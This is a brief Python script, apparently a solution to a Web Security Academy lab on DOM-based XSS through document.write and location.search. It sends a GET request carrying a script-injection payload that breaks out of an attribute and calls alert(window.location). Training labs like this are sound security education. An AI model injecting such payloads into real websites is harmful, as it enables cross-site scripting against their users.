# DOM XSS in document.write sink using source location.search

import requests
import re

url = "https://0a1300d503e82021c0dc7266007d00e8.web-security-academy.net/"
cookies = dict(session="OW25Q4cfEio1ZfrPJkp0AP48bBLEWUwb")

PAYLOAD = "\"><script>alert(window.location)</script>"

params = {
	"search": PAYLOAD
}
r = requests.get(url, params=params)
print(r.text)
print(r.url)
